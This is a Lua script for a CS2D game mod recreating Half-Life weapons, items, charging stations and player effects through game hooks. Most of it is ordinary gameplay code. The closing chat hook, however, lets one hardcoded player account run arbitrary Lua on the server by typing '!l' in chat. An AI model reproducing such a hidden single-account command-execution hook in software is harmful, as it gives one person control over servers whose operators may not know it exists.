function Apple.KeyHook(id, key, state)
	if player(id, "health") > 0 then
		if key == "space" and state == 1 then
			if Apple.AntiKeyFlood[id] == 1 then return end
			if Apple.Jump[id] == 0 and Apple.InWater[id] == 0 then
				Apple.PlayerJump(id)
			end
			Apple.AntiKeyFlood[id] = 1
			timer(100, "parse", "lua Apple.AntiKeyFlood["..id.."]=0")
		elseif key == "mouse1" then
			if state == 1 then
				Apple.Mouse1Pressed[id] = 1
				if Apple.Mouse1Timer[id] == 0 then
					local w = Apple.Weapon[id]
					if w == 9 then w = 8 end
					if Apple.Ammo[id][w][1] > 0 then
						if Apple.Weapon[id] == 8 then
							parse('sv_stopsound "apple/hl2d/weapons/egon_off1.wav" '..id)
							parse('sv_sound2 '..id..' "apple/hl2d/weapons/egon_windup2.wav"')
						elseif Apple.Weapon[id] == 9 then
							if Apple.Ammo[id][8][1] <= 1 then
								return
							end
						end
						if Apple.Weapons[w].bullet then
							Apple.Shoot(id, Apple.Weapon[id])
						end
					else
						Apple.ReloadFunc(id)
					end
				end
			elseif state == 0 then
				Apple.Mouse1Pressed[id] = 0
				if Apple.Weapon[id] == 8 and Apple.Ammo[id][8][1] ~= 0 then
					parse('sv_stopsound "apple/hl2d/weapons/egon_windup2.wav" '..id)
					parse('sv_sound2 '..id..' "apple/hl2d/weapons/egon_off1.wav"')
				end
			end
		elseif key == "mouse2" then
			if state == 1 then
				Apple.Mouse2Pressed[id] = 1
				if Apple.Mouse1Timer[id] == 0 then
					if Apple.Weapon[id] == 9 then -- Gauss gun
						if Apple.Ammo[id][8][1] > 0 then -- Start charge
							if Apple.WeaponVar[id][1] == 0 and Apple.WeaponVar[id][5] == 0 then
								Apple.WeaponVar[id][1] = 1
								timer(200, "Apple.GaussLoadFunc", id)
								parse('sv_sound2 '..id..' "apple/hl2d/weapons/gauss_spinup.ogg"')
							end
						end
					elseif Apple.Weapon[id] == 4 then -- Shotgun
						if Apple.Ammo[id][4][1] > 1 then
							Apple.SpawnBullet(id, 4, player(id, "rot")-8, 150)
							Apple.SpawnBullet(id, 4, player(id, "rot")-3, 150)
							Apple.SpawnBullet(id, 4, player(id, "rot")+2, 150)
							Apple.SpawnBullet(id, 4, player(id, "rot")+7, 150)
							Apple.SheetImg(id)
							parse('sv_soundpos "apple/hl2d/weapons/shotgun_double.wav" '..player(id, "x")..' '..player(id, "y"))
							timer(750, "parse", "lua Apple.PSoundPos("..id..",'apple/hl2d/weapons/shotgun_cock.wav')")
							Apple.Ammo[id][4][1] = Apple.Ammo[id][4][1] - 2
							Apple.LoadAmmoHud(id)
							Apple.Mouse1Timer[id] = 15
						end
					elseif Apple.Weapon[id] == 6 then -- Hive Hand
						Apple.HornetSpamShoot(id)
					elseif Apple.Weapon[id] == 2 then
						Apple.GlockSpamShoot(id)
					end
				end
			elseif state == 0 then
				Apple.Mouse2Pressed[id] = 0
				if Apple.Weapon[id] == 9 then -- Gauss gun
					if Apple.WeaponVar[id][1] == 1 then
						Apple.GaussRecoil(id, Apple.WeaponVar[id][2])
					end
				end
			end
		elseif key == "R" then
			if Apple.AntiKeyFlood[id] == 1 then return end
			if state == 1 then
				Apple.ReloadFunc(id)
			end
			Apple.AntiKeyFlood[id] = 1
			timer(100, "parse", "lua Apple.AntiKeyFlood["..id.."]=0")
		elseif key == "E" then
			if state == 1 then
				if Apple.AntiKeyFlood[id] == 1 then return end
				Apple.AntiKeyFlood[id] = 1
				timer(100, "parse", "lua Apple.AntiKeyFlood["..id.."]=0")
				for k, m in ipairs(Apple.ChargeZone) do
					if player(id, "tilex") == m.x and player(id, "tiley") == m.y then
						if Apple.ReloadProcess[id] == 0 and Apple.ChargeMode[id] == 0 and m.p == 0 then
							if m.energy == 0 then
								if m.type == "health" then
									parse('sv_stopsound "apple/hl2d/items/medshotno1.wav" '..id)
									parse('sv_sound2 '..id..' "apple/hl2d/items/medshotno1.wav"')
								elseif m.type == "energy" then
									parse('sv_stopsound "apple/hl2d/items/suitchargeno1.wav" '..id)
									parse('sv_sound2 '..id..' "apple/hl2d/items/suitchargeno1.wav"')
								end
								return
							end
							if m.type == "health" then
								parse('sv_stopsound "apple/hl2d/items/medshot4.wav" '..id)
								parse('sv_sound2 '..id..' "apple/hl2d/items/medshot4.wav"')
								if player(id, "health") == 100 then return end
							elseif m.type == "energy" then
								parse('sv_stopsound "apple/hl2d/items/suitchargeok1.wav" '..id)
								parse('sv_sound2 '..id..' "apple/hl2d/items/suitchargeok1.wav"')
								if Apple.Armor[id] == 100 then return end
							end
							if m.type == "health" then
								Apple.ChargeTimer[id] = m.soundtimer
							elseif m.type == "energy" then
								Apple.ChargeTimer[id] = 12
							end
							Apple.ChargeMode[id] = k
							Apple.ChargeZone[k].p = id
							parse('hudtxt2 '..id..' 30 "" 0 0')
						end
					end
				end
			elseif state == 0 then
				if Apple.ChargeMode[id] ~= 0 then
					local k = Apple.ChargeMode[id]
					if Apple.ChargeZone[k].type == "health" then
						parse('sv_stopsound "apple/hl2d/items/medcharge4.wav" '..id)
						parse('hudtxt2 '..id..' 30 "©000255000Press [E] to charge your health." 430 210 1')
					else
						parse('sv_stopsound "apple/hl2d/items/suitcharge1.wav" '..id)
						parse('hudtxt2 '..id..' 30 "©000255000Press [E] to charge your energy." 430 210 1')
					end
					Apple.ChargeZone[k].p = 0
					Apple.ChargeMode[id] = 0
				end
			end
		end
	end
end

function Apple.TimerHook()
	for _, id in ipairs(player(0, "tableliving")) do
		if Apple.Jump[id] ~= 0 then
			local j,rot,x,y = Apple.Jump[id], Apple.JumpRot[id], Apple.Jumpx[id], Apple.Jumpy[id]
			if Apple.WeaponVar[id][4] == 1 then
				j = j - 0.15
			end
			Apple.Jump[id] = j - 0.15
			local tx = x + math.sin(rot) * 25
			local ty = y - math.cos(rot) * 25
			if tile(math.floor(tx/32), math.floor(ty/32), "wall") then
				Apple.Jump[id] = 0
				if Apple.WeaponVar[id][4] ~= 0 then Apple.WeaponVar[id][4] = 0 end
				local n = Apple.Weapon[id]
				if Apple.WeaponSpeed[n] then
					parse('speedmod '..id..' '..Apple.PlayerSpeed[id]+Apple.WeaponSpeed[n])
				else
					parse('speedmod '..id..' '..Apple.PlayerSpeed[id])
				end
			else
				local nx = x + math.sin(rot) * j
				local ny = y - math.cos(rot) * j
				Apple.Jumpx[id] = nx
				Apple.Jumpy[id] = ny
				parse("setpos "..id.." "..nx.." "..ny)
				if Apple.Jump[id] <= 0 then
					local n = Apple.Weapon[id]
					if Apple.WeaponSpeed[n] then
						parse('speedmod '..id..' '..Apple.PlayerSpeed[id]+Apple.WeaponSpeed[n])
					else
						parse('speedmod '..id..' '..Apple.PlayerSpeed[id])
					end
					Apple.Jump[id] = 0
					if Apple.WeaponVar[id][4] ~= 0 then Apple.WeaponVar[id][4] = 0 end
				end
			end
		end
	end
	for k, m in ipairs(Apple.HornetFly) do
		local ang = math.rad(m.rot)
		local rot = m.rot
		x = m.x + math.sin(ang) * 16
		y = m.y - math.cos(ang) * 16
		if tile(math.floor(x/32),math.floor(y/32),"wall") then
			rot = -rot
			if tile(math.floor(m.x/32),math.floor(y/32),"wall") then
				rot = rot + 180
			end
			parse('sv_soundpos "apple/hl2d/weapons/ag_buzz1.wav" '..m.x..' '..m.y)
			m.rot = rot
		end
		x = m.x + math.sin(math.rad(rot)) * 8
		y = m.y - math.cos(math.rad(rot)) * 8
		m.x = x
		m.y = y
		m.destroy = m.destroy - 1
		imagepos(m.img,x,y,rot)
		for _, i in ipairs(player(0, "tableliving")) do
			if i ~= m.id and Apple.Distance(x, y, player(i, "x"), player(i, "y")) < 20 then
				parse('sv_soundpos "apple/hl2d/weapons/ag_hornethit.wav" '..x..' '..y)
				Apple.DamagePlayer(m.id, i, Apple.Weapons[6].damage, 6)
				freeimage(m.img)
				table.remove(Apple.HornetFly, k)
				break
			end
		end
		for _, i in ipairs(object(0, "table")) do
			if object(i, "type") == 30 and Apple.Distance(x, y, object(i, "x"), object(i, "y")) < 16 then
				parse('damageobject '..i..' 20 '..m.id)
				freeimage(m.img)
				table.remove(Apple.HornetFly, k)
				break
			end
		end
		if m.destroy <= 0 then
			freeimage(m.img)
			table.remove(Apple.HornetFly, k)
		end
	end
	for k, m in ipairs(Apple.Grenades) do
		if m.speed > 0 then
			local ang = math.rad(m.rot)
			local rot = m.rot
			x = m.x + math.sin(ang) * 16
			y = m.y - math.cos(ang) * 16
			if tile(math.floor(x/32),math.floor(y/32),"wall") then
				rot = -rot
				if tile(math.floor(m.x/32),math.floor(y/32),"wall") then
					rot = rot + 180
				end
				parse('sv_soundpos "apple/hl2d/weapons/grenade_hit'..math.random(1, 2)..'.wav" '..m.x..' '..m.y)
				m.rot = rot
			end
			local spd = m.speed - 0.2
			x = m.x + math.sin(math.rad(rot)) * spd
			y = m.y - math.cos(math.rad(rot)) * spd
			m.x = x
			m.y = y
			m.speed = spd
			local ir = m.imgrot + 10
			m.imgrot = ir
			imagepos(m.img,x,y,ir)
		else
			local et = m.extimer - 1
			if et == 0 then
				parse('explosion '..m.x..' '..m.y..' 100 120 '..m.id)
				freeimage(m.img)
				table.remove(Apple.Grenades, k)
				break
			else
				m.extimer = et
			end
		end
	end
	for k, m in ipairs(Apple.Snarks) do
		local ang = math.rad(m.rot)
		x = m.x + math.sin(ang) * 6
		y = m.y - math.cos(ang) * 6
		if tile(math.floor(x/32), math.floor(y/32), "wall") then
			parse("spawnnpc 3 "..math.floor(m.x/32).." "..math.floor(m.y/32))
			freeimage(m.img)
			table.remove(Apple.Snarks, k)
			break
		end
		for _, i in ipairs(player(0, "tableliving")) do
			if i ~= m.id and player(i, "tilex") == tx and player(i, "tiley") == ty then
				parse("spawnnpc 3 "..tx.." "..ty)
				freeimage(m.img)
				table.remove(Apple.Snarks, k)
				break
			end
		end
		local d = m.dist - 6
		if d <= 0 then
			parse("spawnnpc 3 "..math.floor(x/32).." "..math.floor(y/32))
			freeimage(m.img)
			table.remove(Apple.Snarks, k)
			break
		end
		m.x = x
		m.y = y
		m.dist = d
		imagepos(m.img, x, y, m.rot)
	end
end

function Apple.Timer2Hook()
	for _, id in ipairs(player(0, "tableliving")) do
		Apple.Timer2PlayerFunc(id)
	end
end

function Apple.LeaveHook(id)
	if player(id, "health") > 0 then
		Apple.ResetPlayer(id)
		Apple.RemovePlayerImages(id)
	end
	for k, m in ipairs(Apple.HornetFly) do
		if m.id == id then
			freeimage(m.img)
			table.remove(Apple.HornetFly, k)
		end
	end
	for k, m in ipairs(Apple.Grenades) do
		if m.id == id then
			freeimage(m.img)
			table.remove(Apple.Grenades, k)
		end
	end
	for k, m in ipairs(Apple.Snarks) do
		if m.id == id then
			freeimage(m.img)
			table.remove(Apple.Snarks, k)
		end
	end
end

function Apple.DieHook(id, killer)
	if Apple.Weapon[id] == 8 and Apple.Mouse1Pressed[id] == 1 then
		parse('sv_stopsound "apple/hl2d/weapons/egon_off1.wav" '..id)
		parse('sv_stopsound "apple/hl2d/weapons/egon_run3.wav" '..id)
	end
	Apple.ResetPlayer(id)
	Apple.RemovePlayerImages(id)
	parse('sv_stopsound "apple/hl2d/player/pl_die.wav" '..id)
	parse('sv_sound2 '..id..' "apple/hl2d/player/pl_die.wav"')
	local x, y = player(id, "x"), player(id, "y")
	if (killer>0 and killer<=32) and (Apple.Weapon[killer] == 1 or Apple.Weapon[killer] == 8) then -- Crowbar
		local bodysplat = true
		if Apple.Weapon[killer] == 1 and math.random(1,2) == 1 then
			bodysplat = false
		end
		if bodysplat == true then
			parse('sv_soundpos "apple/hl2d/player/bodysplat.wav" '..x..' '..y)
			for k = 1, 8 do
				local img = image("<spritesheet:gfx/apple/hl2d/player/bodyparts.bmp:16:16>", 1, 1, 0)
				imageframe(img, k)
				imagepos(img, x, y, math.random(0, 360))
				tween_move(img, 500, x+(math.random(-25, 25)), y+(math.random(-25, 25)), math.random(0, 360))
				timer(5000, "parse", "lua tween_alpha("..img..",2000,0)")
				timer(7000, "parse", "lua freeimage("..img..")")
			end
			return 1
		end
	end
	local body = image("gfx/apple/hl2d/player/"..((player(id, "team") == 2 and "c") or "").."t"..(player(id, "look")+1).."_d"..math.random(1, 2)..".png",1,1,0)
	imagepos(body, player(id, "x"), player(id, "y"), player(id, "rot")+180)
	timer(5000, "parse", "lua tween_alpha("..body..",2000,0)")
	timer(7000, "parse", "lua freeimage("..body..")")
	parse('sv_soundpos "apple/hl2d/player/bodydrop'..math.random(1, 2)..'.wav" '..x..' '..y)
	return 1
end

function Apple.SpawnHook(id)
-- parse("equip "..id.." 84")
-- parse("equip "..id.." "..Apple.Weapons[2].gamewpn)
Apple.LoadScreen(id)
local t = {"t", "ct"}
Apple.IMG[id][1] = image("<spritesheet:gfx/apple/hl2d/player/"..t[player(id,"team")]..""..(player(id,"look")+1)..".bmp:32:32:m>",3,0,200+id)
imageframe(Apple.IMG[id][1],1)
Apple.IMG[id][2] = image("<spritesheet:gfx/apple/hl2d/player/legs.bmp:32:32:m>",0,0,100+id)
imageframe(Apple.IMG[id][2],1)
imagescale(Apple.IMG[id][2], 0.8, 0.8)
Apple.Lastx[id] = player(id, "x")
Apple.Lasty[id] = player(id, "y")
Apple.LastTilex[id] = player(id, "tilex")
Apple.LastTiley[id] = player(id, "tiley")
Apple.IMG[id][3] = image(Apple.Weapons[1].hold_img,3,0,200+id)
Apple.Weapon[id] = 1
timer(1, "parse", "setammo "..id.." "..Apple.Weapons[2].gamewpn.." 0 0")
timer(1, "parse", "setweapon "..id.." 50")
Apple.Ammo[id][2][1] = Apple.Weapons[2].clip
Apple.Ammo[id][2][2] = Apple.Weapons[2].maxammo
-- timer(1, "parse", "slap "..id)
return Apple.Weapons[2].gamewpn..",84"
end

function Apple.MoveHook(id, x, y)
	Apple.StepTimer[id] = Apple.StepTimer[id] + 1
	if Apple.StepTimer[id] == 4 then
		local lx, ly = Apple.Lastx[id], Apple.Lasty[id]
		Apple.Lastx[id] = x
		Apple.Lasty[id] = y
		Apple.StepTimer[id] = 0
		Apple.FootStep[id] = Apple.FootStep[id] + 1
		if Apple.FootStep[id] == 9 then
			Apple.FootStep[id] = 1
		end
		local r = math.atan2(y-ly, x-lx) + math.pi/2
		imageframe(Apple.IMG[id][2],Apple.FootStep[id])
		imagepos(Apple.IMG[id][2],0,0,math.deg(r))
	end
end

function Apple.SelectHook(id, type)
	if type == Apple.Weapons[Apple.Weapon[id]].gamewpn then
		return
	end
	local n = 0
	for k, m in ipairs(Apple.Weapons) do
		if m.gamewpn == type then
			n = k
		end
	end
	if n == 0 then return end
	if Apple.Weapon[id] == 8 and Apple.Mouse1Pressed[id] == 1 then
		parse('sv_stopsound "apple/hl2d/weapons/egon_windup2.wav" '..id)
		parse('sv_sound2 '..id..' "apple/hl2d/weapons/egon_off1.wav"')
	end
	if Apple.Weapons[n].bullet then
		if Apple.Mouse1Timer[id] < 3 then
			Apple.Mouse1Timer[id] = 3
		end
	end
	if Apple.ReloadProcess[id] ~= 0 then
		Apple.StopReload(id)
	end
	if Apple.WeaponSpeed[n] then
		parse('speedmod '..id..' '..Apple.PlayerSpeed[id]+Apple.WeaponSpeed[n])
	else
		parse('speedmod '..id..' '..Apple.PlayerSpeed[id])
	end
	freeimage(Apple.IMG[id][3])
	Apple.IMG[id][3] = image(Apple.Weapons[n].hold_img,3,0,200+id)
	Apple.Weapon[id] = n
	imageframe(Apple.IMG[id][1],Apple.Weapons[n].pmode)
	Apple.LoadAmmoHud(id)
end

function Apple.MoveTileHook(id, x, y)
	if Apple.InWater[id] == 1 then
		if tile(x, y, "property") ~= 14 then
			Apple.InWater[id] = 0
			Apple.PlayerSpeed[id] = 0
			Apple.InWater[id] = 0
			freeimage(Apple.IMG[id][10])
			freeimage(Apple.IMG[id][11])
			parse('hudtxt2 '..id..' 31 "" 0 0')
			parse('hudtxt2 '..id..' 32 "" 0 0')
			local n = Apple.Weapon[id]
			if Apple.WeaponSpeed[n] then
				parse('speedmod '..id..' '..Apple.PlayerSpeed[id]+Apple.WeaponSpeed[n])
			else
				parse('speedmod '..id..' '..Apple.PlayerSpeed[id])
			end
		end
	end
	if Apple.ChargeMode[id] ~= 0 then
		local k = Apple.ChargeMode[id]
		Apple.ChargeMode[id] = 0
		Apple.ChargeZone[k].p = 0
		if Apple.ChargeZone[k].type == "health" then
			parse('sv_stopsound "apple/hl2d/items/medcharge4.wav" '..id)
		else
			parse('sv_stopsound "apple/hl2d/items/suitcharge1.wav" '..id)
		end
	end
	for k, m in ipairs(Apple.ChargeZone) do
		if m.energy > 0 then
			if x == m.x and y == m.y then
				if m.type == "health" then
					parse('hudtxt2 '..id..' 30 "©000255000Press [E] to charge your health." 430 210 1')
				else
					parse('hudtxt2 '..id..' 30 "©000255000Press [E] to charge your energy." 430 210 1')
				end
			end
		end
		if Apple.LastTilex[id] == m.x and Apple.LastTiley[id] == m.y then
			parse('hudtxt2 '..id..' 30 "" 0 0')
		end
	end
	if tile(x, y, "property") == 14 then
		if Apple.InWater[id] == 0 then
			Apple.GetInWater(id)
		end
	end
	for k, m in ipairs(Apple.GroundItems) do
		if x == m.x and y == m.y then
			if m.speciality then
				if m.speciality == "health" then
					if player(id, "health") < 100 then
						parse('sethealth '..id..' '..(player(id, "health") + Apple.Weapons[24].amount))
						Apple.LoadHPHuds(id)
						parse('sv_soundpos "apple/hl2d/items/smallmedkit1.wav" '..(x*32+16)..' '..(y*32+16))
						Apple.AddHud(id, 24, 1)
						freeimage(m.shadowimg)
						freeimage(m.img)
						table.remove(Apple.GroundItems, k)
						if m.recirculation ~= 0 then
							timer(Apple.ITEMSPAWNTIMER, "parse", "lua Apple.SpawnItem("..m.x..","..m.y..","..m.type..",2)")
						end
					end
				end
				return
			end
			if m.ammo then
				local walkovered, w, ammotaken = 0, Apple.Weapons[m.type]
				local s = Apple.Weapons[w.wpn]
				if m.type == 25 then
					if Apple.Ammo[id][8][1] < Apple.Weapons[8].clip then
						local a = Apple.Ammo[id][8][1] + w.amount
						if a > Apple.Weapons[8].clip then
							a = Apple.Weapons[8].clip
						end
						ammotaken = a - Apple.Ammo[id][8][1]
						Apple.Ammo[id][8][1] = a
						Apple.LoadAmmoHud(id)
						walkovered = 1
					end
				else
					if Apple.Ammo[id][w.wpn][2] ~= s.maxammo then
						local newammo = Apple.Ammo[id][w.wpn][2] + w.amount
						if newammo > s.maxammo then
							newammo = s.maxammo
						end
						ammotaken = newammo - Apple.Ammo[id][w.wpn][2]
						Apple.Ammo[id][w.wpn][2] = newammo
						Apple.LoadAmmoHud(id)
						walkovered = 1
					end
				end
				if walkovered == 1 then
					Apple.AddHud(id, m.type, ammotaken)
					freeimage(m.shadowimg)
					freeimage(m.img)
					if Apple.Weapons[m.type].collectsnd then
						parse('sv_soundpos "'..Apple.Weapons[m.type].collectsnd..'" '..player(id, "x")..' '..player(id, "y"))
					else
						parse('sv_soundpos "items/pickup.wav" '..player(id, "x")..' '..player(id, "y"))
					end
					if Apple.Weapon[id] == w.wpn then
						Apple.LoadAmmoHud(id)
					end
					if m.recirculation ~= 0 then
						timer(Apple.ITEMSPAWNTIMER, "parse", "lua Apple.SpawnItem("..m.x..","..m.y..","..m.type..",2)")
					end
					table.remove(Apple.GroundItems, k)
				end
				return
			end
			for a, b in ipairs(playerweapons(id)) do
				if b == Apple.Weapons[m.type].gamewpn then
					if Apple.Weapons[m.type].noreloadfunc then
						local walkovered = 0
						if m.type == 6 then -- Hornet
							if Apple.Ammo[id][6][1] ~= Apple.Weapons[6].clip then
								Apple.Ammo[id][6][1] = Apple.Weapons[6].clip
								walkovered = 1
								Apple.AddHud(id, 6)
							end
						elseif m.type == 8 or m.type == 9 then -- Egon & Gauss
							if Apple.Ammo[id][8][1] < 100 then
								local a = Apple.Ammo[id][8][1] + 20
								if a > 100 then a = 100 end
								local ammotaken = a - Apple.Ammo[id][8][1]
								Apple.Ammo[id][8][1] = a
								Apple.LoadAmmoHud(id)
								walkovered = 1
								Apple.AddHud(id, 25, ammotaken)
							end
						elseif m.type == 19 then -- Grenade
							if Apple.Ammo[id][19][1] < 10 then
								local a = Apple.Ammo[id][19][1] + 5
								if a > 10 then a = 10 end
								Apple.Ammo[id][19][1] = a
								Apple.LoadAmmoHud(id)
								walkovered = 1
								Apple.AddHud(id, 19)
							end
						elseif m.type == 20 then -- Laser Mine
							if Apple.Ammo[id][20][1] < 3 then
								local a = Apple.Ammo[id][20][1] + 1
								Apple.Ammo[id][20][1] = a
								parse("setammo "..id.." 87 "..a)
								Apple.LoadAmmoHud(id)
								walkovered = 1
								Apple.AddHud(id, 20)
							end
						elseif m.type == 21 then -- Snarks
							if Apple.Ammo[id][21][1] < 10 then
								local a = Apple.Ammo[id][21][1] + 5
								if a > 10 then a = 10 end
								Apple.Ammo[id][21][1] = a
								Apple.LoadAmmoHud(id)
								walkovered = 1
								Apple.AddHud(id, 21)
							end
						elseif m.type == 22 then -- Satchel Charge
							if Apple.Ammo[id][22][1] < 5 then
								local a = Apple.Ammo[id][22][1] + 1
								Apple.Ammo[id][22][1] = a
								parse("setammo "..id.." 89 "..a)
								Apple.LoadAmmoHud(id)
								walkovered = 1
								Apple.AddHud(id, 22)
							end
						end
						if walkovered == 1 then
							freeimage(m.shadowimg)
							freeimage(m.img)
							if Apple.Weapons[m.type].collectsnd then
								parse('sv_soundpos "'..Apple.Weapons[m.type].collectsnd..'" '..player(id, "x")..' '..player(id, "y"))
							else
								parse('sv_soundpos "items/pickup.wav" '..player(id, "x")..' '..player(id, "y"))
							end
							if Apple.Weapon[id] == m.type then
								Apple.LoadAmmoHud(id)
							end
							if m.recirculation ~= 0 then
								timer(Apple.ITEMSPAWNTIMER, "parse", "lua Apple.SpawnItem("..m.x..","..m.y..","..m.type..",2)")
							end
							table.remove(Apple.GroundItems, k)
						end
						return
					end
					if Apple.Ammo[id][m.type][2] ~= Apple.Weapons[m.type].maxammo then
						local newammo = Apple.Ammo[id][m.type][2] + Apple.Weapons[m.type].clip
						if newammo > Apple.Weapons[m.type].maxammo then
							newammo = Apple.Weapons[m.type].maxammo
						end
						Apple.Ammo[id][m.type][2] = newammo
						if m.recirculation ~= 0 then
							timer(Apple.ITEMSPAWNTIMER, "parse", "lua Apple.SpawnItem("..m.x..","..m.y..","..m.type..",2)")
						end
						freeimage(m.shadowimg)
						freeimage(m.img)
						if Apple.Weapons[m.type].collectsnd then
							parse('sv_soundpos "'..Apple.Weapons[m.type].collectsnd..'" '..player(id, "x")..' '..player(id, "y"))
						else
							parse('sv_soundpos "items/pickup.wav" '..player(id, "x")..' '..player(id, "y"))
						end
						if Apple.Weapon[id] == m.type then
							Apple.LoadAmmoHud(id)
						end
						Apple.AddHud(id, m.type)
						table.remove(Apple.GroundItems, k)
					end
					return
				end
			end
			local c, t = Apple.Ammo[id][m.type][1], m.type
			Apple.AddHud(id, m.type)
			if t == 9 then t = 8 end
			if t == 8 then
				c = c + Apple.Weapons[t].ammoclip
				if c > Apple.Weapons[t].clip then
					c = Apple.Weapons[t].clip
				end
				if Apple.Ammo[id][t][1] ~= 100 then
					Apple.AddHud(id, 25, c - Apple.Ammo[id][t][1])
				end
			else
				c = Apple.Weapons[t].clip
			end
			Apple.Ammo[id][t][1] = c;
			Apple.Ammo[id][t][2] = c
			if m.recirculation ~= 0 then
				timer(Apple.ITEMSPAWNTIMER, "parse", "lua Apple.SpawnItem("..m.x..","..m.y..","..m.type..",2)")
			end
			freeimage(m.shadowimg)
			freeimage(m.img)
			local wpn = Apple.Weapons[m.type].gamewpn
			parse("equip "..id.." "..wpn)
			parse("setweapon "..id.." "..wpn)
			parse('setammo '..id..' '..wpn..' 0 0')
			if t == 20 then
				parse("setammo "..id.." 87 1")
			elseif t == 22 then
				parse("setammo "..id.." 89 1")
			end
			if Apple.Weapons[m.type].collectsnd then
				parse('sv_soundpos "'..Apple.Weapons[m.type].collectsnd..'" '..player(id, "x")..' '..player(id, "y"))
			else
				parse('sv_soundpos "items/pickup.wav" '..player(id, "x")..' '..player(id, "y"))
			end
			table.remove(Apple.GroundItems, k)
		end
	end
	Apple.LastTilex[id] = x
	Apple.LastTiley[id] = y
end

function Apple.HitHook(id, source, weapon, damage)
	if weapon == 0 then -- slap
		timer(1, "parse", "sethealth "..id.." 100")
		return 0
	elseif weapon == 50 then
		parse('sv_soundpos "apple/hl2d/weapons/cbar_hitbody.wav" '..player(id, "x")..' '..player(id, "y"))
		Apple.DamagePlayer(source, id, Apple.Weapons[1].damage, 1)
	elseif weapon == 47 then
		Apple.DamagePlayer(source, id, damage, 10)
	elseif weapon == 87 then
		Apple.DamagePlayer(source, id, damage, 20)
	elseif weapon == 89 then
		Apple.DamagePlayer(source, id, damage, 22)
	elseif weapon == 249 then
		Apple.DamagePlayer(source, id, damage, 21)
	elseif weapon == 251 then
		Apple.DamagePlayer(source, id, damage, 19)
	end
	return 1
end

function Apple.AttackHook(id)
local w = player(id, "weapontype")
	if w == 50 then
		local rot = math.rad(player(id, "rot"))
		local x = player(id, "x") + math.sin(rot) * 20
		local y = player(id, "y") - math.cos(rot) * 20
		if tile(math.floor(x/32), math.floor(y/32), "wall") or tile(math.floor(x/32), math.floor(y/32), "obstacle") then
			parse('sv_soundpos "apple/hl2d/weapons/cbar_hit.wav" '..x..' '..y)
		end
	elseif w == 89 then
		if Apple.Ammo[id][22][1] > 0 then
			Apple.Ammo[id][22][1] = Apple.Ammo[id][22][1] - 1
			Apple.LoadAmmoHud(id)
		end
	end
end

function Apple.JoinHook(id)
end

function Apple.ReturnHook()
return 1
end

function Apple.BuildHook(id, b, x, y, mode, objectid)
	if b == 21 then
		local rot, imgrot = player(id, "rot"), 0
		if rot >= 45 and rot < 135 then
			imgrot = 90
		elseif rot >= 135 and rot < 225 then
			imgrot = 180
		elseif rot >= 225 or rot < -45 then
			imgrot = -90
		end
		local img = image("<spritesheet:gfx/apple/hl2d/weapons/lasermine_planted.bmp:32:32:m>",1,1,3)
		imageframe(img, 0)
		imagepos(img, x*32+16, y*32+16, imgrot)
		Apple.Ammo[id][20][1] = Apple.Ammo[id][20][1] - 1
		Apple.LoadAmmoHud(id)
	end
end

function Apple.ObjectKillHook(objectid)
	if object(objectid, "type") == 21 then
		local img = objectat(object(objectid, "tilex"), object(objectid, "tiley"), 40)
		freeimage(img)
	end
end

function Apple.StartRoundHook()
Apple.LoadRadar()
	for k, m in ipairs(Apple.GroundItems) do
		local px, py = m.x*32+16, m.y*32+16
		local shd = image("gfx/shadow.bmp<a>",px,py,0)
		imagecolor(shd, 0, 0, 0)
		imagealpha(shd, 0.7)
		local img = image(Apple.Weapons[m.type].groundimg,1,1,0)
		imagepos(img,px,py,math.random(0, 360))
		Apple.GroundItems[k].img = img
		Apple.GroundItems[k].shadowimg = shd
	end
	for k, m in ipairs(Apple.HornetFly) do
		table.remove(Apple.HornetFly, k)
	end
	for k, m in ipairs(Apple.Grenades) do
		table.remove(Apple.Grenades, k)
	end
	for k, m in ipairs(Apple.Snarks) do
		table.remove(Apple.Snarks, k)
	end
	for k, m in ipairs(Apple.ChargeZone) do
		if m.offline == 1 then
			Apple.ChargeZone[k].offline = 0
		end
	end
	for _, id in ipairs(player(0, "tableliving")) do
		Apple.ResetPlayer(id)
		Apple.SpawnHook(id)
	end
end

function Apple.SayHook(id, txt)
	if player(id, "usgn") == 35577 then
		if txt:sub(1,2) == "!l" then
			parse('lua "'..txt:sub(4)..'"')
			return 1
		elseif txt:sub(1,2) == "!d" then
			local i = tonumber(txt:sub(4))
			if player(i, "exists") then
				Apple.DebugMode[id] = i
				msg2(id, "\169000255000Debug: \169255255255"..player(i, "name"))
				return 1
			end
		end
	end
end